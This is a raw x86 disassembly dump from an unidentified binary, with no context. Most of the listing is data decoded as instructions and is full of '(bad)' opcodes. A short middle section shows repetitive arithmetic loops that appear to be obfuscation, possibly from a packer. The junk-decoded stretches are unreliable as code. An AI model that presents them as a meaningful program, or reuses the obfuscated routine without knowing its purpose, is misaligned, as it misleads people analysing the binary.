  41ae40:	das    
  41ae41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae42:	(bad)  
  41ae44:	xchg   ecx,eax
  41ae45:	imul   edx,DWORD PTR [ecx-0x47edf20a],0x14
  41ae4c:	cmp    bh,dh
  41ae4e:	es dec ebp
  41ae50:	test   al,0xf7
  41ae52:	or     al,0x58
  41ae54:	(bad)  
  41ae55:	pop    edx
  41ae56:	fwait
  41ae57:	xor    edx,DWORD PTR [esp+edx*8-0x2a]
  41ae5b:	and    eax,0xc00fd6c8
  41ae60:	and    bl,BYTE PTR [ebp+0xb]
  41ae63:	xchg   edi,ecx
  41ae65:	and    BYTE PTR [esi-0x64324ce7],dl
  41ae6b:	adc    BYTE PTR [edi],dh
  41ae6d:	cli    
  41ae6e:	cmp    DWORD PTR [ebp+0x52],esi
  41ae71:	pop    ds
  41ae72:	loop   0x41ae2f
  41ae74:	mov    ebx,0x95f45884
  41ae79:	add    al,0xd7
  41ae7b:	repnz repz fmul DWORD PTR [edx-0x19f99be5]
  41ae83:	idiv   ch
  41ae85:	daa    
  41ae86:	push   esp
  41ae87:	pop    ds
  41ae88:	push   esp
  41ae89:	retf   0x87dd
  41ae8c:	ds imul ecx,edi,0x6d879ac0
  41ae93:	rol    DWORD PTR [ebx+0xb],1
  41ae96:	jmp    0x41ae79
  41ae98:	mov    ch,0x12
  41ae9a:	in     al,0x13
  41ae9c:	dec    edx
  41ae9d:	sub    eax,DWORD PTR [ecx-0x3a01a0e]
  41aea3:	add    al,BYTE PTR [edi+ecx*4-0x50345cbf]
  41aeaa:	fild   WORD PTR [ecx+0x70e679a5]
  41aeb0:	mov    ecx,0xc1040ee2
  41aeb5:	and    ch,BYTE PTR [eax+0x6f]
  41aeb8:	jmp    0x41aec5
  41aeba:	iret   
  41aebb:	je     0x41aea4
  41aebd:	mov    dh,0x85
  41aebf:	push   eax
  41aec0:	sahf   
  41aec1:	in     al,0x75
  41aec3:	out    dx,eax
  41aec4:	mov    ch,0x21
  41aec6:	or     eax,DWORD PTR [ebx]
  41aec8:	test   DWORD PTR ds:0xfbc20732,edx
  41aece:	popf   
  41aecf:	mov    ds:0x605e291b,al
  41aed4:	ja     0x41aeae
  41aed6:	xor    ebp,DWORD PTR [edx+0x3e5bcaaa]
  41aedc:	daa    
  41aedd:	ds mov bh,0x63
  41aee0:	cmp    dh,al
  41aee2:	leave  
  41aee3:	jmp    0xe68794b8
  41aee8:	xor    al,0xba
  41aeea:	jns    0x41aec2
  41aeec:	lods   eax,DWORD PTR ds:[esi]
  41aeed:	shl    dl,1
  41aeef:	ins    DWORD PTR es:[edi],dx
  41aef0:	dec    eax
  41aef1:	lock gs pop ebp
  41aef4:	jns    0x41af6e
  41aef6:	sub    al,0x6a
  41aef8:	push   cs
  41aef9:	adc    dh,al
  41aefb:	mov    al,ds:0x841baaa
  41af00:	out    dx,eax
  41af01:	pop    esi
  41af02:	dec    esi
  41af03:	iret   
  41af04:	cmp    eax,0x2cbf60b6
  41af09:	xchg   BYTE PTR [edi-0x1067e830],dh
  41af0f:	bound  edx,QWORD PTR [ecx]
  41af11:	cs mov edx,0xbd12a6bd
  41af17:	adc    BYTE PTR [ecx],ch
  41af19:	adc    ch,BYTE PTR [ecx+0x63]
  41af1c:	cmc    
  41af1d:	mov    ah,0x5f
  41af1f:	stos   DWORD PTR es:[edi],eax
  41af20:	test   al,0xa9
  41af22:	mov    ebx,0xbd6c1c3f
  41af27:	inc    eax
  41af28:	push   edi
  41af29:	aam    0x53
  41af2b:	push   0x5d
  41af2d:	xchg   esi,eax
  41af2e:	pop    edx
  41af2f:	dec    eax
  41af30:	inc    edx
  41af31:	jg     0x41aee9
  41af33:	inc    eax
  41af34:	xchg   DWORD PTR [ebp+0x7029acb2],edi
  41af3a:	jne    0x41af58
  41af3c:	push   0x88f76739
  41af41:	sub    DWORD PTR [ecx+0x7b80184e],esp
  41af47:	pop    ds
  41af48:	sar    dh,cl
  41af4a:	dec    edx
  41af4b:	mov    eax,ds:0x172f5b35
  41af50:	std    
  41af51:	mov    ds:0xa38db96d,al
  41af56:	jmp    0x85aa8f01
  41af5b:	and    BYTE PTR [ecx+0x49],bl
  41af5e:	leave  
  41af5f:	mov    al,0x88
  41af61:	or     BYTE PTR [esi],al
  41af63:	inc    edx
  41af64:	in     al,0x95
  41af66:	mov    ss,WORD PTR [eax]
  41af68:	mov    ecx,DWORD PTR [ecx-0x29]
  41af6b:	pop    edx
  41af6c:	pop    edx
  41af6d:	fistp  WORD PTR [ecx-0x3d]
  41af70:	hlt    
  41af71:	pop    es
  41af72:	out    0x1f,al
  41af74:	push   esi
  41af75:	mov    esp,0x87c05099
  41af7a:	xchg   ebp,eax
  41af7b:	sbb    BYTE PTR [esi+0x39234614],bl
  41af81:	fcom   DWORD PTR [ebp-0x7b]
  41af84:	push   ebp
  41af85:	pushf  
  41af86:	dec    eax
  41af87:	jle    0x41af99
  41af89:	lahf   
  41af8a:	ins    DWORD PTR es:[edi],dx
  41af8b:	jp     0x41aff4
  41af8d:	cdq    
  41af8e:	ror    BYTE PTR [esi-0x34fd3db7],1
  41af94:	inc    esi
  41af95:	ror    DWORD PTR [edi+ecx*2],cl
  41af98:	sti    
  41af99:	aad    0x59
  41af9b:	in     al,0x89
  41af9d:	sub    bl,bl
  41af9f:	sbb    ebx,0xffffffde
  41afa2:	or     edx,DWORD PTR [ecx+0x7026157b]
  41afa8:	push   0x4254d883
  41afad:	push   cs
  41afae:	add    cl,BYTE PTR [edx-0x1a]
  41afb1:	mov    cl,0x37
  41afb3:	jp     0x41af72
  41afb5:	mov    ds,WORD PTR [edi+0x73ee0285]
  41afbb:	jae    0x41affd
  41afbd:	out    dx,eax
  41afbe:	add    DWORD PTR [eax],0x43
  41afc1:	in     al,0x40
  41afc3:	dec    edx
  41afc4:	and    edi,0x64
  41afc7:	pop    ecx
  41afc8:	sbb    eax,0xdaa137ed
  41afcd:	xor    dl,BYTE PTR [edi]
  41afcf:	mov    eax,0xa19841e4
  41afd4:	outs   dx,DWORD PTR ds:[esi]
  41afd5:	jo     0x41afd9
  41afd7:	mov    al,ds:0x118479b7
  41afdc:	das    
  41afdd:	add    DWORD PTR [esi+eax*4-0x7c],0x76
  41afe2:	cmp    BYTE PTR [edi+0x496b5f40],bl
  41afe8:	stos   BYTE PTR es:[edi],al
  41afe9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afea:	inc    ebx
  41afeb:	cmp    bh,al
  41afed:	jg     0x41af75
  41afef:	xor    eax,0x87bb858c
  41aff4:	je     0x41af79
  41aff6:	fild   QWORD PTR [edx]
  41aff8:	add    bl,BYTE PTR [edi+0x3a]
  41affb:	jbe    0x41b007
  41affd:	xchg   edx,eax
  41affe:	mov    ebx,0x7bbd0f9a
  41b003:	gs cdq 
  41b005:	sar    DWORD PTR [esi-0x4d],0xdd
  41b009:	mov    BYTE PTR [edx+0x111f1b5],bl
  41b00f:	jmp    0x41afa5
  41b011:	arpl   WORD PTR fs:[esi+0x15be34ef],bx
  41b018:	push   edx
  41b019:	rol    DWORD PTR [ecx+0x782db85e],0x22
  41b020:	outs   dx,DWORD PTR es:[esi]
  41b022:	mov    ebx,0xa9052313
  41b027:	mov    esi,0x863d7473
  41b02c:	aas    
  41b02d:	repnz neg DWORD PTR [ecx-0x1]
  41b031:	or     ebx,esi
  41b033:	pop    edi
  41b034:	jae    0x41afe7
  41b036:	or     eax,0xec66e5df
  41b03b:	pusha  
  41b03c:	push   edx
  41b03d:	sahf   
  41b03e:	out    0xc,eax
  41b040:	(bad)  
  41b041:	push   esp
  41b042:	lds    edx,FWORD PTR [ecx+edx*1]
  41b045:	je     0x41b0b0
  41b047:	add    edx,DWORD PTR [ebx]
  41b049:	bound  esi,QWORD PTR [ecx+0x7c]
  41b04c:	dec    ebp
  41b04d:	inc    edx
  41b04e:	mov    al,ds:0xec558bfb
  41b053:	mov    DWORD PTR [ebp+0x8],edx
  41b056:	jmp    0x41b0cb
  41b05b:	mov    edx,DWORD PTR [ebp+0x8]
  41b05e:	mov    ebx,DWORD PTR [ebp-0x8]
  41b061:	xor    edx,eax
  41b063:	xor    ebx,eax
  41b065:	sub    edx,ebx
  41b067:	sub    edx,esi
  41b069:	xor    edx,eax
  41b06b:	mov    DWORD PTR [ebp+0x8],edx
  41b06e:	mov    edx,DWORD PTR [ebp+0x8]
  41b071:	mov    ebx,DWORD PTR [ebp-0x58]
  41b074:	add    edx,0x5708f1
  41b07a:	imul   edx,ebx
  41b07d:	mov    DWORD PTR [ebp-0x58],edx
  41b080:	mov    edx,DWORD PTR [ebp+0x8]
  41b083:	mov    ebx,DWORD PTR [ebp-0x54]
  41b086:	add    edx,0x64f893
  41b08c:	or     edx,ebx
  41b08e:	mov    DWORD PTR [ebp-0x54],edx
  41b091:	mov    edx,DWORD PTR [ebp+0x8]
  41b094:	mov    ebx,DWORD PTR [ebp-0x50]
  41b097:	add    edx,ecx
  41b099:	xor    edx,ebx
  41b09b:	mov    DWORD PTR [ebp-0x50],edx
  41b09e:	mov    edx,DWORD PTR [ebp+0x8]
  41b0a1:	mov    ebx,DWORD PTR [ebp-0x4c]
  41b0a4:	add    edx,edi
  41b0a6:	and    edx,ebx
  41b0a8:	mov    DWORD PTR [ebp-0x4c],edx
  41b0ab:	mov    edx,DWORD PTR [ebp+0x8]
  41b0ae:	mov    ebx,DWORD PTR [ebp-0x48]
  41b0b1:	lea    edx,[ebx+edx*1+0x241fcde]
  41b0b8:	mov    DWORD PTR [ebp-0x48],edx
  41b0bb:	mov    edx,DWORD PTR [ebp+0x8]
  41b0be:	mov    ebx,0xfa5e1521
  41b0c3:	sub    ebx,edx
  41b0c5:	add    ebx,DWORD PTR [ebp-0x44]
  41b0c8:	mov    DWORD PTR [ebp-0x44],ebx
  41b0cb:	mov    edx,DWORD PTR [ebp+0x8]
  41b0ce:	xor    edx,eax
  41b0d0:	add    edx,esi
  41b0d2:	jne    0x41b05b
  41b0d8:	mov    edx,DWORD PTR [ebp-0x14]
  41b0db:	mov    DWORD PTR [ebp+0x8],edx
  41b0de:	jmp    0x41b153
  41b0e3:	mov    edx,DWORD PTR [ebp+0x8]
  41b0e6:	mov    ebx,DWORD PTR [ebp-0x8]
  41b0e9:	xor    edx,eax
  41b0eb:	xor    ebx,eax
  41b0ed:	sub    edx,ebx
  41b0ef:	sub    edx,esi
  41b0f1:	xor    edx,eax
  41b0f3:	mov    DWORD PTR [ebp+0x8],edx
  41b0f6:	mov    edx,DWORD PTR [ebp+0x8]
  41b0f9:	mov    ebx,DWORD PTR [ebp-0x58]
  41b0fc:	add    edx,0x5708f1
  41b102:	imul   edx,ebx
  41b105:	mov    DWORD PTR [ebp-0x58],edx
  41b108:	mov    edx,DWORD PTR [ebp+0x8]
  41b10b:	mov    ebx,DWORD PTR [ebp-0x54]
  41b10e:	add    edx,0x64f893
  41b114:	or     edx,ebx
  41b116:	mov    DWORD PTR [ebp-0x54],edx
  41b119:	mov    edx,DWORD PTR [ebp+0x8]
  41b11c:	mov    ebx,DWORD PTR [ebp-0x50]
  41b11f:	add    edx,ecx
  41b121:	xor    edx,ebx
  41b123:	mov    DWORD PTR [ebp-0x50],edx
  41b126:	mov    edx,DWORD PTR [ebp+0x8]
  41b129:	mov    ebx,DWORD PTR [ebp-0x4c]
  41b12c:	add    edx,edi
  41b12e:	and    edx,ebx
  41b130:	mov    DWORD PTR [ebp-0x4c],edx
  41b133:	mov    edx,DWORD PTR [ebp+0x8]
  41b136:	mov    ebx,DWORD PTR [ebp-0x48]
  41b139:	lea    edx,[ebx+edx*1+0x241fcde]
  41b140:	mov    DWORD PTR [ebp-0x48],edx
  41b143:	mov    edx,DWORD PTR [ebp+0x8]
  41b146:	mov    ebx,0xfa5e1521
  41b14b:	sub    ebx,edx
  41b14d:	add    ebx,DWORD PTR [ebp-0x44]
  41b150:	mov    DWORD PTR [ebp-0x44],ebx
  41b153:	mov    edx,DWORD PTR [ebp+0x8]
  41b156:	xor    edx,eax
  41b158:	add    edx,esi
  41b15a:	jne    0x41b0e3
  41b160:	mov    edx,DWORD PTR [ebp-0x8]
  41b163:	mov    ebx,DWORD PTR [ebp-0xc]
  41b166:	xor    edx,eax
  41b168:	lea    edx,[edx+ebx*1+0x3272ec]
  41b16f:	mov    DWORD PTR [ebp-0xc],edx
  41b172:	mov    edx,DWORD PTR [ebp-0x10]
  41b175:	xor    edx,eax
  41b177:	add    edx,esi
  41b179:	jne    0x411e2e
  41b17f:	jmp    0x41d637
  41b184:	mov    ecx,DWORD PTR [ebp-0x14]
  41b187:	mov    DWORD PTR [ebp+0x8],ecx
  41b18a:	jmp    0x41b203
  41b18f:	mov    ecx,DWORD PTR [ebp+0x8]
  41b192:	mov    edx,DWORD PTR [ebp-0x8]
  41b195:	xor    ecx,eax
  41b197:	xor    edx,eax
  41b199:	sub    ecx,edx
  41b19b:	sub    ecx,esi
  41b19d:	xor    ecx,eax
  41b19f:	mov    DWORD PTR [ebp+0x8],ecx
  41b1a2:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1a5:	mov    edx,DWORD PTR [ebp-0x58]
  41b1a8:	add    ecx,0x5708f1
  41b1ae:	imul   ecx,edx
  41b1b1:	mov    DWORD PTR [ebp-0x58],ecx
  41b1b4:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1b7:	mov    edx,DWORD PTR [ebp-0x54]
  41b1ba:	add    ecx,0x64f893
  41b1c0:	or     ecx,edx
  41b1c2:	mov    DWORD PTR [ebp-0x54],ecx
  41b1c5:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1c8:	mov    edx,DWORD PTR [ebp-0x50]
  41b1cb:	add    ecx,0x242ebcc
  41b1d1:	xor    ecx,edx
  41b1d3:	mov    DWORD PTR [ebp-0x50],ecx
  41b1d6:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1d9:	mov    edx,DWORD PTR [ebp-0x4c]
  41b1dc:	add    ecx,edi
  41b1de:	and    ecx,edx
  41b1e0:	mov    DWORD PTR [ebp-0x4c],ecx
  41b1e3:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1e6:	mov    edx,DWORD PTR [ebp-0x48]
  41b1e9:	lea    ecx,[edx+ecx*1+0x241fcde]
  41b1f0:	mov    DWORD PTR [ebp-0x48],ecx
  41b1f3:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1f6:	mov    edx,0xfa5e1521
  41b1fb:	sub    edx,ecx
  41b1fd:	add    edx,DWORD PTR [ebp-0x44]
  41b200:	mov    DWORD PTR [ebp-0x44],edx
  41b203:	mov    ecx,DWORD PTR [ebp+0x8]
  41b206:	xor    ecx,eax
  41b208:	add    ecx,esi
  41b20a:	jne    0x41b18f
  41b210:	jmp    0x41d643
  41b215:	mov    ecx,DWORD PTR [ebp+0x8]
  41b218:	mov    edx,DWORD PTR [ebp-0x8]
  41b21b:	xor    ecx,eax
  41b21d:	xor    edx,eax
  41b21f:	sub    ecx,edx
  41b221:	sub    ecx,esi
  41b223:	xor    ecx,eax
  41b225:	mov    DWORD PTR [ebp+0x8],ecx
  41b228:	mov    ecx,DWORD PTR [ebp+0x8]
  41b22b:	mov    edx,DWORD PTR [ebp-0x58]
  41b22e:	add    ecx,0x5708f1
  41b234:	imul   ecx,edx
  41b237:	mov    DWORD PTR [ebp-0x58],ecx
  41b23a:	mov    ecx,DWORD PTR [ebp+0x8]
  41b23d:	mov    edx,DWORD PTR [ebp-0x54]
  41b240:	add    ecx,0x64f893
  41b246:	or     ecx,edx
  41b248:	mov    DWORD PTR [ebp-0x54],ecx
  41b24b:	mov    ecx,DWORD PTR [ebp+0x8]
  41b24e:	mov    edx,DWORD PTR [ebp-0x50]
  41b251:	add    ecx,0x242ebcc
  41b257:	xor    ecx,edx
  41b259:	mov    DWORD PTR [ebp-0x50],ecx
  41b25c:	mov    ecx,DWORD PTR [ebp+0x8]
  41b25f:	mov    edx,DWORD PTR [ebp-0x4c]
  41b262:	add    ecx,edi
  41b264:	and    ecx,edx
  41b266:	mov    DWORD PTR [ebp-0x4c],ecx
  41b269:	mov    ecx,DWORD PTR [ebp+0x8]
  41b26c:	mov    edx,DWORD PTR [ebp-0x48]
  41b26f:	jmp    0x41d610
  41b274:	enter  0x7064,0x8f
  41b278:	sar    BYTE PTR [ebx+0x7b],0x1b
  41b27c:	add    al,0xea
  41b27e:	sbb    DWORD PTR [ecx],0xd9ba6b47
  41b284:	mov    dh,0xf0
  41b286:	jge    0x41b302
  41b288:	(bad)  
  41b289:	pop    edi
  41b28a:	jp     0x41b306
  41b28c:	nop
  41b28d:	jp     0x41b26e
  41b28f:	mov    bl,0x5e
  41b291:	or     BYTE PTR [ebx-0x71baa5d6],ah
  41b297:	pushf  
  41b298:	dec    ecx
  41b299:	aaa    
  41b29a:	fild   QWORD PTR [ebp+0x7011839f]
  41b2a0:	mov    ds:0x9a9c05f5,al
  41b2a5:	icebp  
  41b2a6:	ss xchg esp,eax
  41b2a8:	stos   DWORD PTR es:[edi],eax
  41b2a9:	test   DWORD PTR [edx-0x5e705b4],esi
  41b2af:	jl     0x41b2e5
  41b2b1:	je     0x41b2bc
  41b2b3:	xlat   BYTE PTR ds:[ebx]
  41b2b4:	cmc    
  41b2b5:	push   ebx
  41b2b6:	test   DWORD PTR ds:0x6138f22a,0xc6792067
  41b2c0:	(bad)  
  41b2c1:	daa    
  41b2c2:	or     BYTE PTR [edx],0x2a
  41b2c5:	mov    cl,0x59
  41b2c7:	mov    dl,0x3d
  41b2c9:	cmp    al,0x26
  41b2cb:	add    al,dl
  41b2cd:	dec    ebp
  41b2ce:	add    BYTE PTR ds:0x958810f5,dl
  41b2d4:	jo     0x41b295
  41b2d6:	ins    BYTE PTR es:[edi],dx
  41b2d7:	sbb    al,0x4d
  41b2d9:	lahf   
  41b2da:	lods   eax,DWORD PTR ds:[esi]
  41b2db:	js     0x41b2c4
  41b2dd:	test   BYTE PTR [edx+edx*1+0x7a],cl
  41b2e1:	jmp    0x939f:0xe6cf06bd
  41b2e8:	stc    
  41b2e9:	ds push 0xb713b2a3
  41b2ef:	jne    0x41b2ac
  41b2f1:	add    DWORD PTR [ebp-0x1cd3815a],edi
  41b2f7:	xchg   ebp,eax
  41b2f8:	daa    
  41b2f9:	outs   dx,BYTE PTR ds:[esi]
  41b2fa:	push   esp
  41b2fb:	push   es
  41b2fc:	sbb    al,BYTE PTR [edi]
  41b2fe:	sub    BYTE PTR ds:0xe482745a,bl
  41b304:	enter  0x1916,0x82
  41b308:	push   es
  41b309:	aas    
  41b30a:	xor    esi,DWORD PTR [ecx-0x2a]
  41b30d:	and    DWORD PTR [eax+eax*1+0x26391c1d],edi
  41b314:	add    DWORD PTR [ebx+0x7e],edx
  41b317:	jbe    0x41b2f5
  41b319:	sub    cl,BYTE PTR [ebp+0x70]
  41b31c:	lods   eax,DWORD PTR ds:[esi]
  41b31d:	imul   esp,DWORD PTR [ebp-0x62],0x7d
  41b321:	mov    cl,0x1d
  41b323:	popf   
  41b324:	fucom  st(1)
  41b326:	popf   
  41b327:	clc    
  41b328:	js     0x41b38b
  41b32a:	mov    dh,0x4a
  41b32c:	stc    
  41b32d:	clc    
  41b32e:	cmp    ecx,DWORD PTR [ebp+0x16]
  41b331:	push   ss
  41b332:	pop    edi
  41b333:	or     al,0x6
  41b335:	mul    BYTE PTR [esi+0x78ef7f77]
  41b33b:	and    BYTE PTR [ecx-0x7d],dl
  41b33e:	xor    DWORD PTR [ebp-0x2d],eax
  41b341:	mov    dh,0x4a
  41b343:	leave  
  41b344:	adc    bl,BYTE PTR [esi+0x7a]
  41b347:	pop    edi
  41b348:	pop    ecx
  41b349:	cmp    eax,0x8ad30aaa
  41b34e:	sub    bh,BYTE PTR [ebx-0x53]
  41b351:	mov    dh,0x67
  41b353:	dec    esi
  41b354:	stos   BYTE PTR es:[edi],al
  41b355:	jbe    0x41b392
  41b357:	add    ch,BYTE PTR [esi]
  41b359:	imul   BYTE PTR [eax]
  41b35b:	fnsave [edi-0x1b2f4afe]
  41b361:	lock xchg esi,eax
  41b363:	scas   eax,DWORD PTR es:[edi]
  41b364:	out    dx,eax
  41b365:	out    dx,al
  41b366:	cmp    DWORD PTR [ebx-0xe5886a],edi
  41b36c:	mov    eax,ds:0x5b5ebfe0
  41b371:	repnz (bad) 
  41b373:	jne    0x41b3f2
  41b375:	test   eax,0xd4c00402
  41b37a:	add    cl,BYTE PTR [ebx]
  41b37c:	lahf   
  41b37d:	int    0xf4
  41b37f:	xchg   edx,eax
  41b380:	xlat   BYTE PTR ds:[ebx]
  41b381:	jbe    0x41b3b8
  41b383:	pop    eax
  41b384:	mov    edi,ebx
  41b386:	or     DWORD PTR [esi-0x4c],esp
  41b389:	das    
  41b38a:	fldcw  WORD PTR [ecx-0x7b]
  41b38d:	push   0x49
  41b38f:	jb     0x41b3d6
  41b391:	pop    ebp
  41b392:	dec    ecx
  41b393:	dec    edi
  41b394:	xor    dh,al
  41b396:	aas    
  41b397:	add    BYTE PTR ds:0x3a86eea,bl
  41b39d:	pop    edi
  41b39e:	mov    WORD PTR [ecx+0xd086860],ds
  41b3a4:	sahf   
  41b3a5:	pop    ss
  41b3a6:	int    0x57
  41b3a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3a9:	cdq    
  41b3aa:	and    eax,0x37bb4706
  41b3af:	div    DWORD PTR [ebx+eiz*4-0x7f]
  41b3b3:	in     ax,dx
  41b3b5:	mov    fs,WORD PTR [ebp-0x263d6d92]
  41b3bb:	out    0x68,eax
  41b3bd:	into   
  41b3be:	dec    esp
  41b3bf:	pop    es
  41b3c0:	lahf   
  41b3c1:	xchg   BYTE PTR ds:0xb502449f,ah
  41b3c7:	dec    edi
  41b3c8:	dec    eax
  41b3c9:	loopne 0x41b369
  41b3cb:	stos   DWORD PTR es:[edi],eax
  41b3cc:	xchg   edi,eax
  41b3cd:	sub    edx,eax
  41b3cf:	push   edi
  41b3d0:	mov    ah,0x76
  41b3d2:	gs xchg esp,eax
  41b3d4:	(bad)  
  41b3d5:	jno    0x41b416
  41b3d7:	sub    al,0xf3
  41b3d9:	xor    eax,DWORD PTR [ebx-0x37]
  41b3dc:	xchg   ebp,eax
  41b3dd:	jle    0x41b386
  41b3df:	out    0x57,al
  41b3e1:	mov    BYTE PTR [ecx-0xa],bh
  41b3e4:	mov    DWORD PTR [ebx+ebx*8],esi
  41b3e7:	sbb    DWORD PTR [edi],ebp
  41b3e9:	mov    dl,0x4c
  41b3eb:	stos   DWORD PTR es:[edi],eax
  41b3ec:	sbb    ecx,DWORD PTR [edi]
  41b3ee:	cmp    DWORD PTR [ebx-0x3d2d8794],esp
  41b3f4:	push   ebp
  41b3f5:	mov    ecx,0x3c117ad8
  41b3fa:	dec    edi
  41b3fb:	mov    ah,0x48
  41b3fd:	in     al,dx
  41b3fe:	sub    eax,DWORD PTR [edx]
  41b400:	div    DWORD PTR [eax+0x75]
  41b403:	mov    ?,WORD PTR [edi-0x7d1669a]
  41b409:	pop    eax
  41b40a:	xor    bh,bh
  41b40c:	mov    al,ds:0x402588c2
  41b411:	(bad)  
  41b412:	mov    ?,edx
  41b414:	leave  
  41b415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b416:	mov    ah,0x2d
  41b418:	push   es
  41b419:	pusha  
  41b41a:	(bad)  
  41b41c:	pop    edx
  41b41e:	scas   eax,DWORD PTR es:[edi]
  41b41f:	cld    
  41b420:	aaa    
  41b421:	mov    esp,?
  41b423:	xor    dh,BYTE PTR [ecx+0x5596fa87]
  41b429:	(bad)  
  41b42a:	adc    bh,dl
  41b42c:	xchg   ecx,eax
  41b42d:	repnz repz in al,0x6f
  41b431:	je     0x41b49f
  41b433:	pop    ebx
  41b434:	sbb    al,0x51
  41b436:	sub    DWORD PTR [edx+0x41],ecx
  41b439:	add    al,0xf2
  41b43b:	nop
  41b43c:	shl    edi,cl
  41b43e:	in     al,dx
  41b43f:	jb     0x41b4a1
  41b441:	xchg   BYTE PTR ds:0xa2c78a82,bh
  41b447:	out    0x24,al
  41b449:	out    dx,al
  41b44a:	nop
  41b44b:	or     dh,BYTE PTR [edi]
  41b44d:	fsubr  st,st(5)
  41b44f:	mov    eax,0xd18bcb3c
  41b454:	pop    esp
  41b455:	and    ebp,ebx
  41b457:	ins    BYTE PTR es:[edi],dx
  41b458:	lahf   
  41b459:	pop    ebp
  41b45a:	icebp  
  41b45b:	ret    0xd1c
  41b45e:	xor    bl,BYTE PTR cs:[edx+0x54fbecc2]
  41b465:	out    0x78,eax
  41b467:	mul    ebp
  41b469:	not    DWORD PTR [edi+0x29f5d544]
  41b46f:	xchg   ebx,eax
  41b470:	xor    al,BYTE PTR [esi+ebp*8]
  41b473:	dec    edx
  41b474:	bound  esi,QWORD PTR [edi]
  41b476:	jecxz  0x41b46a
  41b478:	jns    0x41b46b
  41b47a:	ds sub dh,0xc2
  41b47e:	daa    
  41b47f:	popa   
  41b480:	push   ebp
  41b481:	ds ret 
  41b483:	lea    ebp,[ebx-0x73d846a0]
  41b489:	push   0xffffff84
  41b48b:	(bad)  
  41b48d:	fdiv   st,st(3)
  41b48f:	lods   eax,DWORD PTR ds:[esi]
  41b490:	sbb    eax,0xe988a470
  41b495:	adc    al,0x98
  41b497:	test   DWORD PTR [edx+0x22b86212],esi
  41b49d:	push   0xf343aa9b
  41b4a2:	sbb    DWORD PTR [ebx+0x39],ecx
  41b4a5:	adc    eax,0xfe33cffe
  41b4aa:	icebp  
  41b4ab:	pop    ss
  41b4ac:	in     eax,dx
  41b4ad:	fidiv  DWORD PTR [ecx-0xf]
  41b4b0:	pop    esp
  41b4b1:	loope  0x41b4db
  41b4b3:	adc    eax,0x5f805f80
  41b4b8:	dec    esp
  41b4b9:	and    eax,0x21c5e2e0
  41b4be:	pop    ecx
  41b4bf:	ret    
  41b4c0:	not    dl
  41b4c2:	pop    es
  41b4c3:	(bad)  
  41b4c4:	inc    ebx
  41b4c6:	sub    cl,BYTE PTR [ecx+0x7df0c506]
  41b4cc:	aam    0xb2
  41b4ce:	ret    
  41b4cf:	adc    eax,0x5f802fce
  41b4d4:	mov    ebp,0xaaded6b5
  41b4d9:	imul   esp,ebx,0x1f19489
  41b4df:	call   0x2305:0x3206aa11
  41b4e6:	push   esp
  41b4e7:	ins    DWORD PTR es:[edi],dx
  41b4e8:	xor    esi,DWORD PTR [ecx]
  41b4ea:	out    0xfb,eax
  41b4ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4ed:	iret   
  41b4ee:	call   DWORD PTR [eax-0x13be8c0c]
  41b4f4:	fistp  WORD PTR [ecx+ecx*4+0x3e2072ca]
  41b4fb:	je     0x41b548
  41b4fd:	inc    edx
  41b4fe:	jae    0x41b4fe
  41b500:	xor    eax,0xa70891b
  41b505:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41b507:	test   edi,eax
  41b509:	add    eax,0x2649ecb6
  41b50e:	push   0x170fc1aa
  41b513:	bound  edx,QWORD PTR [ecx+eiz*8-0x43]
  41b517:	fistp  WORD PTR [edi]
  41b519:	push   esi
  41b51a:	test   BYTE PTR [ecx+0x57],bl
  41b51d:	dec    ebx
  41b51e:	push   esi
  41b51f:	addr16 cli 
  41b521:	inc    ebp
  41b522:	jl     0x41b533
  41b524:	xchg   BYTE PTR [edx],ch
  41b526:	shl    DWORD PTR [esi+0x35],0x8
  41b52a:	or     eax,0xc21679a8
  41b52f:	in     eax,0x72
  41b531:	cmp    eax,0xe08ee620
  41b536:	fnstsw WORD PTR [ebx+0x17d432a9]
  41b53c:	add    eax,0xd3ffef51
  41b541:	or     edi,DWORD PTR [edi-0x6c]
  41b544:	sub    DWORD PTR [esi],ecx
  41b546:	pop    esp
  41b547:	lahf   
  41b548:	das    
  41b549:	pushf  
  41b54a:	adc    bl,0x6e
  41b54d:	(bad)  
  41b54e:	mov    edx,0x999a60d3
  41b553:	jns    0x41b5cf
  41b555:	pop    esp
  41b556:	ss hlt 
  41b558:	ins    DWORD PTR es:[edi],dx
  41b559:	mov    WORD PTR [edx-0x6cd3c352],fs
  41b55f:	add    BYTE PTR [esi],bh
  41b561:	std    
  41b562:	mov    esp,0xc15c128b
  41b567:	pushf  
  41b568:	adc    eax,DWORD PTR [ebx]
  41b56a:	or     al,0xf6
  41b56c:	stos   BYTE PTR es:[edi],al
  41b56d:	ror    DWORD PTR [esp+edi*1-0x27dba23a],1
  41b574:	jle    0x41b551
  41b576:	inc    ecx
  41b577:	pusha  
  41b578:	jg     0x41b5b7
  41b57a:	sbb    al,0x7c
  41b57c:	fnstsw WORD PTR [ecx-0x4d]
  41b57f:	into   
  41b580:	ret    
  41b581:	enter  0x468a,0x65
  41b585:	std    
  41b586:	dec    ecx
  41b587:	(bad)  
  41b588:	lods   al,BYTE PTR ds:[esi]
  41b589:	add    esp,DWORD PTR [eax-0x22]
  41b58c:	shl    ecx,0x66
  41b58f:	push   edx
  41b590:	shl    DWORD PTR [esp+edx*1],0x64
  41b594:	dec    esp
  41b595:	imul   ecx,DWORD PTR [ebx],0x3eb637ca
  41b59b:	leave  
  41b59c:	and    al,0xd0
  41b59e:	les    eax,FWORD PTR [eax+0x56e8340f]
  41b5a4:	mov    ch,0xdd
  41b5a6:	inc    eax
  41b5a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5a8:	mov    eax,ecx
  41b5aa:	daa    
  41b5ab:	mov    edi,DWORD PTR [ebx-0x2a]
  41b5ae:	ror    DWORD PTR [eax+eax*8+0x4bb9d80c],0xd8
  41b5b6:	std    
  41b5b7:	test   edi,ebx
  41b5b9:	sti    
  41b5ba:	aad    0x5
